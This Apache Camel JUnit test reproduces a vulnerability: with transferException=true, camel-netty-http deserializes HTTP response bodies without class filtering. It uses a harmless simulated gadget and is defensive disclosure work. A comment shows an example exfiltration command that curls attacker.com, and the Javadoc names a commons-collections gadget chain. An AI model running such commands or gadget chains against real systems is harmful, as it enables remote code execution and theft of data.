/*
 * Licensed to the Apache Software Foundation (ASF) under one or more
 * contributor license agreements.  See the NOTICE file distributed with
 * this work for additional information regarding copyright ownership.
 * The ASF licenses this file to You under the Apache License, Version 2.0
 * (the "License"); you may not use this file except in compliance with
 * the License.  You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.apache.camel.component.netty.http;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;

import org.apache.camel.CamelExecutionException;
import org.apache.camel.Exchange;
import org.apache.camel.builder.RouteBuilder;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * Reproducer demonstrating that camel-netty-http deserializes HTTP response bodies without ObjectInputFilter when
 * {@code transferException=true}.
 *
 * <p>
 * <b>Attack scenario:</b> A malicious or compromised upstream server responds with HTTP 500, Content-Type
 * {@code application/x-java-serialized-object}, and a crafted serialized payload. The Camel client-side producer
 * deserializes it via {@link NettyHttpHelper#deserializeJavaObjectFromStream} without any class filtering, allowing
 * arbitrary code execution through gadget chains.
 * </p>
 *
 * <p>
 * This test sets up a "malicious server" endpoint that returns a serialized {@link SimulatedGadget} (a non-Exception
 * class) in the HTTP response. The client calls it with {@code transferException=true}, and the gadget's
 * {@code readObject()} executes during deserialization.
 * </p>
 */
public class NettyHttpUnfilteredDeserializationReproducerTest extends BaseNettyTestSupport {

    @BeforeEach
    void resetGadget() {
        SimulatedGadget.executed = false;
    }

    @Test
    public void testMaliciousServerCanTriggerArbitraryDeserialization() {
        // The client calls a "malicious server" with transferException=true.
        // The server responds with HTTP 500 + Content-Type: application/x-java-serialized-object
        // containing a serialized SimulatedGadget (NOT an Exception).
        //
        // NettyHttpHelper.deserializeJavaObjectFromStream() deserializes it without
        // any ObjectInputFilter, so SimulatedGadget.readObject() runs on the client.

        assertThrows(CamelExecutionException.class,
                () -> template.requestBody(
                        "netty-http:http://localhost:{{port}}/malicious?transferException=true",
                        "Hello World", String.class));

        assertTrue(SimulatedGadget.executed,
                "SimulatedGadget.readObject() was called on the CLIENT side during deserialization "
                                             + "of the server's HTTP response. A malicious server can exploit this for RCE. "
                                             + "An ObjectInputFilter should restrict deserialization to Exception subclasses only.");
    }

    @Override
    protected RouteBuilder createRouteBuilder() {
        return new RouteBuilder() {
            @Override
            public void configure() {
                // Simulates a malicious server that responds with a crafted serialized
                // payload instead of a legitimate serialized Exception.
                from("netty-http:http://0.0.0.0:{{port}}/malicious?transferException=true")
                        .process(exchange -> {
                            // Serialize a non-Exception gadget object
                            SimulatedGadget gadget = new SimulatedGadget();
                            ByteArrayOutputStream baos = new ByteArrayOutputStream();
                            try (ObjectOutputStream oos = new ObjectOutputStream(baos)) {
                                oos.writeObject(gadget);
                            }

                            // Return it as the response body with the serialized-object content type
                            // and HTTP 500 to trigger the transferException deserialization path
                            exchange.getMessage().setBody(baos.toByteArray());
                            exchange.getMessage().setHeader(Exchange.CONTENT_TYPE,
                                    NettyHttpConstants.CONTENT_TYPE_JAVA_SERIALIZED_OBJECT);
                            exchange.getMessage().setHeader(Exchange.HTTP_RESPONSE_CODE, 500);
                        });
            }
        };
    }

    /**
     * Simulates a deserialization gadget. In a real attack this would be a class from a library on the classpath (e.g.,
     * commons-collections InvokerTransformer) that chains to {@code Runtime.getRuntime().exec("malicious command")}.
     *
     * <p>
     * Note that this is NOT an Exception subclass. The fact that it gets deserialized proves that
     * {@link NettyHttpHelper#deserializeJavaObjectFromStream} accepts any Serializable class, not just Exceptions.
     * </p>
     */
    public static class SimulatedGadget implements Serializable {
        private static final long serialVersionUID = 1L;

        static volatile boolean executed;

        private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
            in.defaultReadObject();
            // In a real gadget chain this would be:
            //   Runtime.getRuntime().exec("curl http://attacker.com/steal?data=...");
            executed = true;
        }
    }
}
